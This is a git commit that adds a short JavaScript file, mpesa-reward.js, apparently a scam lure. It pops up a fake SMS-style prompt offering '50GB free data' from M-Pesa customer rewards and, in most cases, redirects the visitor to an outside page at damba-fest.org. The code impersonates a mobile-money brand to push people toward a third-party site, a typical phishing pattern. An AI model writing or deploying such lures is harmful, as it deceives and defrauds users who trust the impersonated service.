7b2762b4234618acb1bce94aa774335b4a62b1c7
boss-bloq <nsisboy01@gmail.com>
2024-10-15 08:47:22 -0700

    Create mpesa-reward.js

---
+++ mpesa-reward.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 50GB '
+password=prompt('SMS: Hello, Claim your 50GB free data from M-pesa old customers rewards . Press Ok to Claim now ','CLAIM 50GB');
+if (password != 'CLAIM 50GB') {
+location.href='https://damba-fest.org/mpesa.html';
+}
